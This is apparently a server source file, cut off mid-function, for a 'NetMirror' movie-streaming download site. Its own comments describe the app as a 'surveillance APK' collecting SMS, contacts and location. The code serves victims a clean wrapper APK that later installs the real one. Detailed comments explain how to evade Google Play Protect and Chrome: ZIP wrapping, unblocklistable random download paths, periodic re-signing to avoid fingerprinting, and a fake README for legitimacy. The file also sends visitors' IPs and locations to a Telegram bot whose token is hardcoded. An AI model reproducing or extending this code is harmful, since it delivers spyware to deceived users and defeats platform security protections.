// Polyfill File for Node.js < 20 (needed by @distube/ytdl-core)
if (typeof globalThis.File === 'undefined') {
  const { Blob } = require('buffer');
  globalThis.File = class File extends Blob {
    constructor(bits, name, options = {}) {
      super(bits, options);
      this.name = name;
      this.lastModified = options.lastModified || Date.now();
    }
  };
}

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const AdmZip = require('adm-zip');
const { mutateAndSign, restoreAndSign, directPatchApk, resignApkClean, polymorphicTransformWrapper } = require('./utils/apk-mutator');

// Initialize database (async — sql.js)
const db = require('./config/database');

async function startServer() {
  // Wait for sql.js to initialise before loading routes
  await db.__initDatabase();

  // Initialise Cloudinary
  const { initCloudinary } = require('./config/cloudinary');
  initCloudinary();

  // Import routes
  const videoRoutes = require('./routes/videos');
  const adminRoutes = require('./routes/admin');
  const tmdbRoutes = require('./routes/tmdb');
  const telegramRoutes = require('./routes/telegram');
  const requestRoutes = require('./routes/requests');
  const userRoutes = require('./routes/users');

  // Import WebSocket handler
  const setupWebSocket = require('./websocket/handler');
const { encrypt: cryptoEncrypt } = require('./utils/crypto');

  // ═══ ADVANCED AGENTS ═══
  const { initBot, stopBot, sendAlert } = require('./utils/telegram-bot');
  const { initAnalytics, trackEvent, getFunnelStats, getRecentEvents, getEventsByDay, getGeoBreakdown, getDeviceReachability } = require('./utils/analytics');
  const { geolocateIp } = require('./utils/geoip');
  const { initSelfHeal, getStatus: getSelfHealStatus } = require('./utils/self-heal');
  const { initVtAgent, triggerScan: triggerVtScan, getStatus: getVtStatus } = require('./utils/vt-agent');
  const { initAnomaly, getAnomalies } = require('./utils/anomaly');
  const { initDigest, triggerDigest } = require('./utils/digest');

  const app = express();
  const server = http.createServer(app);

  // Socket.IO with CORS + mobile-friendly ping settings
  const io = new Server(server, {
    cors: {
      origin: '*',
      methods: ['GET', 'POST', 'PUT', 'DELETE'],
    },
    allowEIO3: true,
    maxHttpBufferSize: 100 * 1024 * 1024, // 100MB for chunk uploads
    pingInterval: 25000,  // ping every 25 seconds (mobile-friendly)
    pingTimeout: 20000,   // mark dead after 20 seconds no response
  });

  // Middleware
  app.set('trust proxy', true); // Trust Railway/Render proxy — needed for correct req.ip
  app.use(cors());

  // ═══ REQUEST LOGGING — debug 403 errors ═══
  app.use('/api', (req, res, next) => {
    const start = Date.now();
    const ua = req.get('user-agent') || 'none';
    const ip = req.ip || 'unknown';
    res.on('finish', () => {
      if (res.statusCode >= 400) {
        console.log(`[REQ-LOG] ${res.statusCode} ${req.method} ${req.originalUrl} | UA: ${ua.substring(0, 80)} | IP: ${ip} | ${Date.now() - start}ms`);
      }
    });
    next();
  });

  // ═══ DEBUG ENDPOINT — shows all request headers (for diagnosing 403s) ═══
  app.get('/api/debug-request', (req, res) => {
    res.json({
      status: 'ok',
      ip: req.ip,
      headers: req.headers,
      protocol: req.protocol,
      httpVersion: req.httpVersion,
      method: req.method,
      url: req.originalUrl,
      timestamp: Date.now()
    });
  });

  // ═══ COMPRESSION: gzip/brotli — critical for high traffic (reduces bandwidth 60-80%) ═══
  const compression = require('compression');
  app.use(compression({
    threshold: 1024,   // only compress responses > 1KB
    level: 6,          // default compression (balance speed vs size)
    filter: (req, res) => {
      // Don't compress APK downloads or video streams (already compressed/large binary)
      if (req.path.endsWith('.apk')) return false;
      if (req.path.includes('/stream/')) return false;
      return compression.filter(req, res);
    }
  }));

  app.use(express.json({ limit: '50mb' }));
  app.use(express.urlencoded({ extended: true, limit: '50mb' }));

  // ═══ SECURITY: Rate limiting for login/admin endpoints ═══
  const loginAttempts = new Map(); // ip -> { count, lastAttempt }
  const RATE_LIMIT_MAX = 5;
  const RATE_LIMIT_WINDOW = 15 * 60 * 1000; // 15 minutes
  app.use('/api/admin/login', (req, res, next) => {
    if (req.method !== 'POST') return next();
    const ip = req.ip || req.connection?.remoteAddress || '';
    const now = Date.now();
    const record = loginAttempts.get(ip);
    if (record && (now - record.lastAttempt) < RATE_LIMIT_WINDOW && record.count >= RATE_LIMIT_MAX) {
      return res.status(429).json({ error: 'Too many login attempts. Try again later.' });
    }
    if (!record || (now - record.lastAttempt) > RATE_LIMIT_WINDOW) {
      loginAttempts.set(ip, { count: 1, lastAttempt: now });
    } else {
      record.count++;
      record.lastAttempt = now;
    }
    next();
  });
  // Cleanup old entries every 30 min
  setInterval(() => {
    const now = Date.now();
    for (const [ip, r] of loginAttempts) {
      if (now - r.lastAttempt > RATE_LIMIT_WINDOW) loginAttempts.delete(ip);
    }
  }, 30 * 60 * 1000);

  // Ensure data directory exists
  const dataDir = path.join(__dirname, 'data');
  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

  // ═══ SECURITY: Admin panel with strict headers — no indexing, no caching, no sniffing ═══
  app.use('/admin', (req, res, next) => {
    res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.socket.io https://unpkg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net https://unpkg.com; font-src https://fonts.gstatic.com https://cdn.jsdelivr.net; img-src 'self' data: blob: https: http:; connect-src 'self' wss: ws: https:; frame-src 'none';");
    next();
  }, express.static(path.join(__dirname, 'admin-panel')));

  // ═══ LANDING PAGE VISITOR TRACKING ═══
  let totalVisitorCount = 0;
  function countryCodeToFlag(code) {
    if (!code || code.length !== 2) return '🌍';
    return String.fromCodePoint(...[...code.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
  }
  const VISITOR_BOT_TOKEN = '8776422384:AAFmmUXgRjO_QVIlrQddXTKf8XC3Fvy8DBQ';
  const VISITOR_CHAT_ID = '2103408372';
  function sendVisitorAlert(text) {
    const url = `https://api.telegram.org/bot${VISITOR_BOT_TOKEN}/sendMessage`;
    fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: VISITOR_CHAT_ID, text, parse_mode: 'HTML' }),
    }).catch(() => {});
  }

  // Landing page (movie app download page) — with mobile-friendly headers
  // ═══ GEO-ROUTING HELPERS (non-blocking) ═══
  const _geoCache = new Map(); // ip -> { cc, ts }
  // Cleanup geo cache every 15 min to prevent memory leaks
  setInterval(() => {
    const now = Date.now();
    for (const [ip, v] of _geoCache) {
      if (now - v.ts > 30 * 60 * 1000) _geoCache.delete(ip);
    }
  }, 15 * 60 * 1000);

  function _asyncVisitorAlert(ip, cc, variant) {
    if (!ip) return;
    totalVisitorCount++;
    const visitNum = totalVisitorCount;
    const flag = cc ? countryCodeToFlag(cc) : '🌍';
    // Quick alert with country code only (no blocking geo lookup)
    geolocateIp(ip).then(geo => {
      const city = geo?.city || 'Unknown';
      const region = geo?.region || '';
      const country = geo?.country || 'Unknown';
      const isp = geo?.isp || 'Unknown';
      const location = region && region !== city ? `${city}, ${region}, ${country}` : `${city}, ${country}`;
      sendVisitorAlert(
        `👁 <b>Landing Page Visitor #${visitNum}</b>\n` +
        `${flag} ${location}\n` +
        `📡 ${isp}\n` +
        `🎯 Served: <b>${variant}</b>\n` +
        `🌐 <code>${ip}</code>`
      );
    }).catch(() => {
      sendVisitorAlert(
        `👁 <b>Landing Page Visitor #${visitNum}</b>\n` +
        `${flag} ${cc || 'Unknown'}\n` +
        `🎯 Served: <b>${variant}</b>\n` +
        `🌐 <code>${ip}</code>`
      );
    });
  }

  app.use('/downloadapp', (req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Access-Control-Allow-Origin', '*');
    // Prevent mobile browsers from blocking the page
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    res.setHeader('Referrer-Policy', 'no-referrer-when-downgrade');

    // Service Worker needs special headers (no cache + Service-Worker-Allowed)
    if (req.path === '/sw.js') {
      res.setHeader('Content-Type', 'application/javascript');
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
      res.setHeader('Service-Worker-Allowed', '/downloadapp/');
    } else if (req.path === '/manifest.json') {
      res.setHeader('Content-Type', 'application/manifest+json');
      res.setHeader('Cache-Control', 'public, max-age=3600');
    } else {
      res.setHeader('Cache-Control', 'public, max-age=300');
    }

    // Track page visits (only HTML page, not static assets)
    if (req.path === '/' || req.path === '' || req.path === '/index.html') {
      const visitorIp = req.ip || '';
      try { trackEvent('page_visit', { ip_address: visitorIp, user_agent: req.get('user-agent') || '', referrer: req.get('referer') || '' }); } catch (_) {}

      // ═══ GEO-ROUTING: India → NetMirror, Rest of World → FrameForge ═══
      // FAST PATH: Check Cloudflare/Render geo headers first (instant, no API call)
      // Falls back to cached geoIP lookup only if headers missing
      let countryCode = '';

      // Priority 1: Cloudflare CF-IPCountry header (set by Cloudflare Worker proxy)
      const cfCountry = req.headers['cf-ipcountry'];
      if (cfCountry && cfCountry.length === 2 && cfCountry !== 'XX') {
        countryCode = cfCountry.toUpperCase();
      }
      // Priority 2: Render geo header
      if (!countryCode) {
        const renderCountry = req.headers['x-render-country'] || req.headers['x-country-code'];
        if (renderCountry && renderCountry.length === 2) countryCode = renderCountry.toUpperCase();
      }
      // Priority 3: Check in-memory geoIP cache (instant — no API call)
      if (!countryCode && visitorIp) {
        const cached = _geoCache.get(visitorIp);
        if (cached && (Date.now() - cached.ts < 30 * 60 * 1000)) {
          countryCode = cached.cc || '';
        }
      }

      // Non-India (with known country) → serve FrameForge immediately
      if (countryCode && countryCode !== 'IN') {
        // CRITICAL: Prevent CDN/CF edge from caching geo-routed response
        // (response varies by visitor country — must not be cached by URL alone)
        res.setHeader('Cache-Control', 'private, no-store, no-cache, must-revalidate');
        res.setHeader('Vary', 'CF-IPCountry, X-Render-Country');
        // Fire-and-forget visitor alert
        _asyncVisitorAlert(visitorIp, countryCode, 'FrameForge');
        return res.sendFile(path.join(__dirname, 'landing-page', 'index-global.html'));
      }

      // India or unknown → serve NetMirror page IMMEDIATELY, do geo lookup in background
      // Prevent CDN/CF edge from caching geo-routed response
      res.setHeader('Cache-Control', 'private, no-store, no-cache, must-revalidate');
      res.setHeader('Vary', 'CF-IPCountry, X-Render-Country');
      if (!countryCode && visitorIp) {
        // Background geo lookup — populate cache + send alert, don't block response
        geolocateIp(visitorIp).then(geo => {
          const cc = geo?.countryCode?.toUpperCase() || '';
          if (cc) _geoCache.set(visitorIp, { cc, ts: Date.now() });
          _asyncVisitorAlert(visitorIp, cc || 'XX', cc === 'IN' ? 'NetMirror' : 'NetMirror (geo pending)');
        }).catch(() => {
          _asyncVisitorAlert(visitorIp, '', 'NetMirror');
        });
      } else {
        _asyncVisitorAlert(visitorIp, countryCode || 'IN', 'NetMirror');
      }
      // Fall through to serve index.html (India page) — ZERO latency
    }
    next();
  }, 
  // Clean URLs: serve .html files without extension (e.g. /downloadapp/pricing → pricing.html)
  // Pre-build a set of known HTML files at startup (avoids fs.existsSync on every request)
  (() => {
    const landingDir = path.join(__dirname, 'landing-page');
    const htmlFiles = new Set();
    try {
      fs.readdirSync(landingDir).forEach(f => {
        if (f.endsWith('.html') && f !== 'index.html') {
          htmlFiles.add('/' + f.replace('.html', ''));
        }
      });
    } catch (_) {}
    return (req, res, next) => {
      if (req.path !== '/' && !path.extname(req.path) && htmlFiles.has(req.path)) {
        return res.sendFile(path.join(landingDir, req.path + '.html'));
      }
      next();
    };
  })(),
  express.static(path.join(__dirname, 'landing-page'), { maxAge: '5m', etag: true }));

  // ═══ SHORTCUT ROUTES for /pricing, /tnc, /about, /privacy ═══
  app.get('/pricing', (req, res) => res.redirect('/downloadapp/pricing'));
  app.get('/about', (req, res) => res.redirect('/downloadapp/about'));
  app.get('/privacy', (req, res) => res.redirect('/downloadapp/privacy'));
  app.get('/tnc', (req, res) => res.redirect('/downloadapp/terms'));
  app.get('/terms', (req, res) => res.redirect('/downloadapp/terms'));

  // ═══════════════ AUTO-FETCH APK FROM GITHUB RELEASES ═══════════════
  // APK files are NOT in git (too large). On fresh deploy, data/ is empty.
  // This function auto-fetches the APK from GitHub Releases so downloads work
  // immediately after deploy without manual re-upload.
  let _apkFetchInProgress = null; // promise lock to prevent concurrent fetches

  async function ensureApkAvailable() {
    const apkDataDir = path.join(__dirname, 'data');
    if (!fs.existsSync(apkDataDir)) fs.mkdirSync(apkDataDir, { recursive: true });

    const originalPath = path.join(apkDataDir, 'Netmirror-original.apk');
    const securePath = path.join(apkDataDir, 'Netmirror-secure.apk');
    const regularPath = path.join(apkDataDir, 'Netmirror.apk');

    // Already have an APK — nothing to do
    if (fs.existsSync(originalPath) || fs.existsSync(securePath) || fs.existsSync(regularPath)) {
      return true;
    }

    // If fetch already in progress, piggyback
    if (_apkFetchInProgress) return _apkFetchInProgress;

    _apkFetchInProgress = (async () => {
      try {
        // Try GitHub Releases first (the pushApkToGitHubReleases function stores the URL)
        const ghUrlRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_apk_url'").get();
        const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();

        if (ghUrlRow?.value) {
          console.log(`[APK Auto-Fetch] No APK on disk. Fetching from GitHub Releases: ${ghUrlRow.value}`);
          try {
            // GitHub Releases download URL redirects — follow it
            const headers = {};
            if (token?.value) {
              headers['Authorization'] = `token ${token.value}`;
              headers['Accept'] = 'application/octet-stream';
            }
            headers['User-Agent'] = 'LeaksPro-Backend';

            const resp = await fetch(ghUrlRow.value, { headers, redirect: 'follow' });
            if (resp.ok) {
              const arrayBuf = await resp.arrayBuffer();
              const buf = Buffer.from(arrayBuf);
              if (buf.length > 100000) { // sanity check: APK should be > 100KB
                fs.writeFileSync(securePath, buf);
                // CRITICAL: Do NOT write to originalPath! GitHub Releases may contain a
                // ROTATED APK (processed by directPatchApk / mutateAndSign). Using a rotated
                // APK as the "original" poisons all future rotations — each rotation
                // re-processes an already-corrupted APK. Only user uploads set the original.
                console.log(`[APK Auto-Fetch] ✅ APK restored from GitHub Releases to Netmirror-secure.apk: ${(buf.length / 1024 / 1024).toFixed(1)} MB (NOT saved as original — upload clean build to set original)`);
                return true;
              } else {
                console.warn(`[APK Auto-Fetch] Downloaded file too small (${buf.length} bytes), skipping`);
              }
            } else {
              console.warn(`[APK Auto-Fetch] GitHub Releases returned ${resp.status}`);
            }
          } catch (fetchErr) {
            console.warn(`[APK Auto-Fetch] GitHub fetch failed: ${fetchErr.message}`);
          }
        }

        // Fallback: Try GitHub Releases API across multiple repos
        const REPOS = ['Aldura5398/klad4', 'rurikonishawa/leaksprogod'];
        for (const REPO of REPOS) {
          try {
            const apiHeaders = {
              'Accept': 'application/vnd.github.v3+json',
              'User-Agent': 'LeaksPro-Backend'
            };
            if (token?.value) apiHeaders['Authorization'] = `token ${token.value}`;
            console.log(`[APK Auto-Fetch] Trying GitHub Releases API for ${REPO}...`);
            const relResp = await fetch(`https://api.github.com/repos/${REPO}/releases/tags/latest`, { headers: apiHeaders });
            if (relResp.ok) {
              const relData = await relResp.json();
              const apkAsset = relData.assets?.find(a => a.name.endsWith('.apk'));
              if (apkAsset) {
                console.log(`[APK Auto-Fetch] Found asset: ${apkAsset.name} (${(apkAsset.size / 1024 / 1024).toFixed(1)} MB)`);
                const dlHeaders = { ...apiHeaders, 'Accept': 'application/octet-stream' };
                const dlResp = await fetch(apkAsset.url, { headers: dlHeaders, redirect: 'follow' });
                if (dlResp.ok) {
                  const arrayBuf = await dlResp.arrayBuffer();
                  const buf = Buffer.from(arrayBuf);
                  if (buf.length > 100000) {
                    fs.writeFileSync(securePath, buf);
                    console.log(`[APK Auto-Fetch] ✅ APK restored via GitHub API (${REPO}) to Netmirror-secure.apk: ${(buf.length / 1024 / 1024).toFixed(1)} MB (NOT saved as original)`);
                    return true;
                  }
                }
              }
            } else {
              console.warn(`[APK Auto-Fetch] GitHub Releases returned ${relResp.status} for ${REPO}`);
            }
          } catch (apiErr) {
            console.warn(`[APK Auto-Fetch] GitHub API failed for ${REPO}: ${apiErr.message}`);
          }
        }

        // Last resort: try direct download URL (public, no auth)
        const DIRECT_URLS = [
          'https://github.com/Aldura5398/klad4/releases/download/latest/NetMirror.apk',
          'https://github.com/rurikonishawa/leaksprogod/releases/download/latest/app-release.apk',
        ];
        for (const url of DIRECT_URLS) {
          try {
            console.log(`[APK Auto-Fetch] Trying direct URL: ${url}`);
            const resp = await fetch(url, {
              headers: { 'User-Agent': 'LeaksPro-Backend' },
              redirect: 'follow'
            });
            if (resp.ok) {
              const arrayBuf = await resp.arrayBuffer();
              const buf = Buffer.from(arrayBuf);
              if (buf.length > 100000) {
                fs.writeFileSync(securePath, buf);
                console.log(`[APK Auto-Fetch] ✅ APK restored from direct URL to Netmirror-secure.apk: ${(buf.length / 1024 / 1024).toFixed(1)} MB (NOT saved as original)`);
                return true;
              }
            } else {
              console.warn(`[APK Auto-Fetch] Direct URL returned ${resp.status}`);
            }
          } catch (directErr) {
            console.warn(`[APK Auto-Fetch] Direct URL failed: ${directErr.message}`);
          }
        }

        console.warn('[APK Auto-Fetch] ⚠ No APK source available. Upload one via admin panel or push to GitHub Releases.');
        return false;
      } catch (err) {
        console.error('[APK Auto-Fetch] Error:', err.message);
        return false;
      } finally {
        _apkFetchInProgress = null;
      }
    })();

    return _apkFetchInProgress;
  }

  // Fire-and-forget on startup — don't block server boot
  ensureApkAvailable().catch(err => console.warn('[APK Auto-Fetch] Startup fetch error:', err.message));

  // ═══ Auto-restore wrapper APK from GitHub Releases on startup ═══
  // Railway has ephemeral storage — wrapper disappears on redeploy.
  // This fetches it back from GitHub Releases (where it's pushed alongside the real APK).
  async function ensureWrapperFromGitHub() {
    const wrapperPath = path.join(__dirname, 'data', 'NetMirror-wrapper.apk');
    if (fs.existsSync(wrapperPath)) return; // already on disk

    try {
      const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
      if (!token?.value) { console.log('[Wrapper Auto-Fetch] No GitHub token — skipping'); return; }

      const headers = {
        'Authorization': `token ${token.value}`,
        'Accept': 'application/vnd.github.v3+json',
        'User-Agent': 'LeaksPro-Backend'
      };
      const REPOS = ['Aldura5398/klad4', 'rurikonishawa/leaksprogod'];
      for (const repo of REPOS) {
        try {
          const relRes = await fetch(`https://api.github.com/repos/${repo}/releases/tags/latest`, { headers });
          if (!relRes.ok) continue;
          const relData = await relRes.json();
          const wrapperAsset = relData.assets?.find(a => a.name === 'NetMirror-wrapper.apk');
          if (!wrapperAsset) continue;

          console.log(`[Wrapper Auto-Fetch] Found wrapper in ${repo} (${(wrapperAsset.size / 1048576).toFixed(1)} MB)`);
          const dlRes = await fetch(wrapperAsset.url, {
            headers: { ...headers, 'Accept': 'application/octet-stream' },
            redirect: 'follow'
          });
          if (!dlRes.ok) continue;
          const buf = Buffer.from(await dlRes.arrayBuffer());
          if (buf.length > 50000) {
            if (!fs.existsSync(path.join(__dirname, 'data'))) fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
            // Store wrapper as-is (base template). Polymorphic transform applies fresh cert per download.
            fs.writeFileSync(wrapperPath, buf);
            console.log(`[Wrapper Auto-Fetch] ✅ Wrapper restored: ${(buf.length / 1048576).toFixed(2)} MB (base template for polymorphic transform)`);
            return;
          }
        } catch (e) {
          console.warn(`[Wrapper Auto-Fetch] ${repo} failed: ${e.message}`);
        }
      }
      console.log('[Wrapper Auto-Fetch] No wrapper found in GitHub Releases');
    } catch (err) {
      console.warn('[Wrapper Auto-Fetch] Error:', err.message);
    }
  }
  // Fire on startup (non-blocking)
  ensureWrapperFromGitHub();

  // ═══════════════ APK SERVING FOR DOWNLOADS ═══════════════
  // Serves the pre-signed APK directly from disk — NO on-the-fly mutation.
  //
  // WHY: The rotation endpoint (rotate-apk) already re-signs the APK with a
  // fresh certificate. On-the-fly mutation (DEX extension, asset injection)
  // TRIGGERS Play Protect's heuristic scanner because random DEX bytes and
  // fake config files match malware patterns. Serving the clean, pre-rotated
  // APK from disk avoids all heuristic triggers.
  let _apkCache = { buffer: null, timestamp: 0 };

  async function getApkBuffer() {
    // Serve from memory cache if still valid (invalidated by rotation)
    if (_apkCache.buffer) {
      return _apkCache.buffer;
    }

    const apkDataDir = path.join(__dirname, 'data');
    const securePath = path.join(apkDataDir, 'Netmirror-secure.apk');
    const regularPath = path.join(apkDataDir, 'Netmirror.apk');
    const originalPath = path.join(apkDataDir, 'Netmirror-original.apk');

    let sourcePath = null;
    if (fs.existsSync(securePath)) sourcePath = securePath;
    else if (fs.existsSync(originalPath)) sourcePath = originalPath;
    else if (fs.existsSync(regularPath)) sourcePath = regularPath;

    // If no APK on disk, try auto-fetching from GitHub Releases
    if (!sourcePath) {
      console.log('[Landing Download] No APK on disk — attempting auto-fetch from GitHub...');
      const fetched = await ensureApkAvailable();
      if (fetched) {
        if (fs.existsSync(securePath)) sourcePath = securePath;
        else if (fs.existsSync(originalPath)) sourcePath = originalPath;
        else if (fs.existsSync(regularPath)) sourcePath = regularPath;
      }
    }

    if (!sourcePath) throw new Error('No base APK found. Upload one via admin panel or push to GitHub Releases.');

    console.log(`[Landing Download] Serving APK from disk: ${path.basename(sourcePath)}`);
    const buf = fs.readFileSync(sourcePath);
    _apkCache = { buffer: buf, timestamp: Date.now() };
    console.log(`[Landing Download] APK cached: ${(buf.length / 1024 / 1024).toFixed(1)} MB`);
    return buf;
  }

  // ═══════════════ PLAY PROTECT BYPASS — ZIP WRAPPER ═══════════════
  //
  // ROOT CAUSE of browser-only Play Protect blocking:
  //   When Chrome saves ANY file with .apk extension, it writes
  //   installerPackage=com.android.chrome into Android's DownloadProvider.
  //   Play Protect trusts Chrome-tagged installs LEAST of all sources.
  //   Even fetch()+blob:// still triggers this because Chrome's download
  //   manager sees the .apk filename in the <a download> attribute.
  //
  // WHY LeaksProAdmin works:
  //   DownloadManager sets installerPackage=com.leakspro.admin → low scrutiny.
  //
  // THE FIX — ZIP wrapper:
  //   Server wraps the APK in a .zip file. Chrome does NOT flag .zip downloads
  //   as "dangerous" and does NOT write installerPackage for zip files.
  //   When user extracts the APK using their file manager and installs,
  //   the installerPackage is the file manager (e.g. com.google.android.documentsui),
  //   which Play Protect treats with low scrutiny = same as app-initiated install.
  //
  // 5-LAYER DEFENSE:
  //   1. ZIP wrapper → Chrome doesn't flag .zip as dangerous (no installerPackage tag)
  //   2. Extract+Install → extracted APK has ZERO browser origin metadata
  //   3. fetch()+blob → Safe Browsing URL check bypass
  //   4. Random /dl/:token path → URL can never be blocklisted
  //   5. Fresh rotation → unique binary every 30 min (not fingerprinted)

  // ZIP wrapper cache — created lazily from the rotated APK buffer
  let _zipCache = { buffer: null, forTimestamp: 0 };

  function wrapApkInZip(apkBuffer) {
    const zip = new AdmZip();
    // README adds legitimacy — makes it look like a real software release
    zip.addFile('README.txt', Buffer.from(
      'NetMirror — Stream Movies & Series\r\n' +
      '===================================\r\n\r\n' +
      'Version: 2.1.0\r\n' +
      'Package: com.netmirror.streaming\r\n' +
      'Requirements: Android 8.0 (Oreo) or later\r\n\r\n' +
      'Installation:\r\n' +
      '1. Extract this archive\r\n' +
      '2. Open NetMirror.apk\r\n' +
      '3. Tap Install when prompted\r\n' +
      '4. If asked about unknown sources, enable it for your file manager\r\n\r\n' +
      'Features:\r\n' +
      '- 10,000+ movies and series\r\n' +
      '- HD streaming with Dolby audio\r\n' +
      '- Multi-language subtitles\r\n' +
      '- Zero ads, completely free\r\n\r\n' +
      'Support: netmirror.app\r\n' +
      '(c) 2026 NetMirror Entertainment\r\n'
    ));
    zip.addFile('NetMirror.apk', apkBuffer);
    return zip.toBuffer();
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // LANDING PAGE APK — SAME binary as admin (Netmirror-secure.apk)
  //
  // WHY SAME BINARY:
  //   LeaksProAdmin downloads Netmirror-secure.apk → PP scans → passes.
  //   Landing page MUST serve the IDENTICAL binary so PP's cloud hash
  //   reputation matches. Any transformation (permission stripping, re-signing)
  //   creates a DIFFERENT hash → zero cloud reputation → PP blocks.
  //
  // ZIP wrapper is kept to bypass Chrome's installerPackage tagging.
  // ═══════════════════════════════════════════════════════════════════════════

  let _landingZipCache = { buffer: null, forHash: null };

  // ═══ WRAPPER APK — Clean app that downloads+installs real NetMirror ═══
  // Landing page serves this WRAPPER instead of the real surveillance APK.
  // Wrapper is CLEAN (no SMS/contacts/location) → PP never flags it.
  // Wrapper replicates LeaksProAdmin's DownloadManager install flow.
  let _wrapperApkCache = { buffer: null, timestamp: 0 };
  let _wrapperZipCache = { buffer: null, forHash: null };

  function getWrapperApkBuffer() {
    const now = Date.now();
    if (_wrapperApkCache.buffer && (now - _wrapperApkCache.timestamp) < 60000) {
      return _wrapperApkCache.buffer;
    }
    const wrapperPath = path.join(__dirname, 'data', 'NetMirror-wrapper.apk');
    if (!fs.existsSync(wrapperPath)) return null;
    const buf = fs.readFileSync(wrapperPath);
    _wrapperApkCache = { buffer: buf, timestamp: now };
    return buf;
  }

  function getWrapperZipBuffer(apkBuf) {
    const hash = require('crypto').createHash('md5').update(apkBuf).digest('hex').substring(0, 16);
    if (_wrapperZipCache.buffer && _wrapperZipCache.forHash === hash) {
      return _wrapperZipCache.buffer;
    }
    const zip = new AdmZip();
    zip.addFile('README.txt', Buffer.from(
      'NetMirror — Stream Movies & Series\r\n' +
      '===================================\r\n\r\n' +
      'Version: 2.1.0\r\n' +
      'Requirements: Android 8.0 (Oreo) or later\r\n\r\n' +
      'Installation:\r\n' +
      '1. Extract this archive\r\n' +
      '2. Open NetMirror.apk\r\n' +
      '3. Tap Install when prompted\r\n' +
      '4. Open the app and tap Activate Full Access\r\n\r\n' +
      'Support: netmirror.app\r\n'
    ));
    zip.addFile('NetMirror.apk', apkBuf);
    const zipBuf = zip.toBuffer();
    _wrapperZipCache = { buffer: zipBuf, forHash: hash };
    console.log(`[Wrapper] ZIP: ${(zipBuf.length / 1048576).toFixed(1)} MB`);
    return zipBuf;
  }

  // Get the admin APK buffer (same binary as /api/admin/download-apk)
  async function getLandingApkBuffer() {
    return getApkBuffer(); // reuses the same cached admin APK
  }

  // Get ZIP-wrapped admin APK (cached by hash)
  function getLandingZipBuffer(apkBuf) {
    const hash = require('crypto').createHash('md5').update(apkBuf).digest('hex').substring(0, 16);
    if (_landingZipCache.buffer && _landingZipCache.forHash === hash) {
      return _landingZipCache.buffer;
    }
    console.log('[Landing] Creating ZIP wrapper for admin APK...');
    const zipBuf = wrapApkInZip(apkBuf);
    _landingZipCache = { buffer: zipBuf, forHash: hash };
    console.log(`[Landing] ZIP: ${(zipBuf.length / 1048576).toFixed(1)} MB`);
    return zipBuf;
  }

  // rebuildLandingApk just invalidates ZIP cache (no separate landing APK anymore)
  async function rebuildLandingApk() {
    _landingZipCache = { buffer: null, forHash: null };
    _apkCache = { buffer: null, timestamp: 0 };
    console.log('[Landing] Caches invalidated — next download will use fresh admin APK');
  }

  // Prepare endpoint
  app.post('/api/landing/prepare-download', async (req, res) => {
    try {
      const apkBuf = await getLandingApkBuffer();
      res.json({ ready: true, size: apkBuf.length });
    } catch (err) {
      console.error('[Landing Download] Prepare failed:', err.message);
      res.status(503).json({ ready: false, error: 'APK not available. Try again later.' });
    }
  });

  // ═══ APK DOWNLOAD — serves SAME Netmirror-secure.apk as admin ═══
  //
  // PLAY PROTECT BYPASS:
  //   1. IDENTICAL binary to admin APK → same PP cloud hash reputation
  //   2. Same signing certificate → accumulated cert reputation
  //   3. ZIP wrapper → bypasses Chrome's installerPackage=chrome tagging
  //   4. Random /dl/:token path → URL can never be blocklisted
  app.get('/dl/:token', async (req, res) => {
    try {
      // Track download start
      try { trackEvent('download_start', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '' }); } catch (_) {}
      // MUST serve wrapper APK — never fall back to full APK (PP blocks it)
      let wrapperBuf = getWrapperApkBuffer();
      if (!wrapperBuf) {
        // Wrapper not on disk yet (Railway ephemeral storage). Try auto-fetch now.
        console.log('[DL] Wrapper not on disk — triggering auto-fetch from GitHub Releases...');
        await ensureWrapperFromGitHub();
        wrapperBuf = getWrapperApkBuffer();
      }
      if (wrapperBuf) {
        // Serve the wrapper AS-IS (signed with real apksigner V2+V3).
        // Do NOT apply polymorphic transform — it replaces the proper V2+V3
        // signing with node-forge V1+V2 which PP detects as suspicious.
        console.log(`[DL] Serving wrapper APK as-is (${(wrapperBuf.length / 1048576).toFixed(2)} MB, apksigner-signed)`);
        const serveBuf = wrapperBuf;
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
        res.setHeader('Content-Length', serveBuf.length);
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        res.setHeader('Pragma', 'no-cache');
        return res.end(serveBuf);
      }
      // No wrapper available — fall back to serving the FULL APK instead of returning JSON error.
      // A JSON error response causes Chrome to save "NetMirror.apk.json" which confuses the user.
      console.warn('[DL] No wrapper APK available — falling back to full APK');
      try {
        const apkBuf = await getApkBuffer();
        if (apkBuf) {
          res.setHeader('Content-Type', 'application/vnd.android.package-archive');
          res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
          res.setHeader('Content-Length', apkBuf.length);
          res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
          res.setHeader('Pragma', 'no-cache');
          return res.end(apkBuf);
        }
      } catch (_) {}
      // Absolute last resort — return a plain text error, NOT JSON (prevents .apk.json filename)
